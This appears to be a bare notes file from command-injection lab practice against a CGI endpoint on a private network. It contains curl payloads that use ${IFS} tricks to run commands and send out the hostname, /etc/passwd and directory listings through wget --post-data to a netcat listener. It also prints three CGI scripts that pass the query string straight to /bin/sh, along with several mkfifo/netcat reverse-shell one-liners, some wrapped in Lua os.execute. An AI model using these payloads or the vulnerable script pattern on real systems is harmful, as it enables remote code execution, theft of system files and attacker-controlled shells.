echo -ne '\n\n' | nc -q 2 -C -lp 8000 & curl 'http://192.168.102.5:8080/cgi-bin/blind_shell_outofband?wget$\{IFS\}http://<IP GOES HERE>:8000/`hostname|base64`'



tcpdump -i eth0 -n icmp -c 3 2>/dev/null && curl -s 'http://192.168.102.5:8080/cgi-bin/blind_shell_outofband?ping$\{IFS\}192.168.102.2'



echo -ne '\n\n' | nc -q 2 -C -lp 8000 & curl -s 'http://192.168.102.5:8080/cgi-bin/blind_shell_outofband?wget$\{IFS\}http://<IP GOES HERE>:8000/$\{IFS\}--post-data=`cat$\{IFS\}/etc/passwd|base64|tr$\{IFS\}-d$\{IFS\}"\n"`'



echo -ne '\n\n' | nc -q 2 -C -lp 8000 & curl -s 'http://192.168.102.5:8080/cgi-bin/blind_shell_outofband?wget$\{IFS\}http://192.168.102.2:8000/$\{IFS\}--post-data=`ls$\{IFS\}\/tmp|base64|tr$\{IFS\}-d$\{IFS\}"\n"`'




echo -ne '\n\n' | nc -q 2 -C -lp 8000 & curl 'http://192.168.102.5:8080/cgi-bin/blind_shell_outofband?wget$\{IFS\}http://192.168.102.2:8000/$\{IFS\}--post-data=`ls$\{IFS\}\-ltr>/tmp/luisco.txt`'






blind_shell_outofband
```
#!/bin/sh
echo "Content-type: text/html"
echo ""
echo "<html><body><pre>"
#echo "Received command is: "
#echo $QUERY_STRING
cmd=$QUERY_STRING
#echo "Command output is: "
(/bin/sh -c $cmd) > /dev/null &
echo "</pre></body></html>"
echo ""
echo ""
```

blind_shell
```
#!/bin/sh
echo "Content-type: text/html"
echo ""
echo "<html><body><pre>"
#echo "Received command is: "
#echo $QUERY_STRING
cmd=$QUERY_STRING
#echo "Command output is: "
(/bin/sh -c "$cmd") > /dev/null
echo "</pre></body></html>"
echo ""
echo ""
```

shell
```
#!/bin/sh
echo "Content-type: text/html"
echo ""
echo "<html><body><pre>"
#echo "Received command is: "
#echo $QUERY_STRING
cmd=$QUERY_STRING
#echo "Command output is: "
(/bin/sh -c "$cmd") 2>&1
echo "</pre></body></html>"
echo ""
echo ""
```


```
/bin/sh -c &apos;(mkfifo /tmp/a; cat /tmp/a | /bin/sh -i 2>&1 | nc 192.168.1.217 1270 > /tmp/a)&&apos;
```

```
/bin/sh -c &apos;(mkfifo /tmp/zz; cat /tmp/zz | /bin/sh -i 2>&1 | nc 192.168.1.217 1288 > /tmp/zz)&&apos;
```
echo "nc 10.9.0.106 1288" > /tmp/zz

os.execute("/bin/sh -c &apos;(ping -c2 10.9.0.162 )&apos;")


os.execute("/bin/sh -c &apos;(rm /tmp/zz;mkfifo /tmp/zz;cat /tmp/zz | /bin/sh -i 2>&1 | nc 10.9.0.162 4242)&apos;")

os.execute("/bin/sh -c &apos;(rm /tmp/zz;mkfifo /tmp/zz;cat /tmp/zz | /bin/sh -i 2>&1 | nc 10.9.0.162 4242)&apos;")


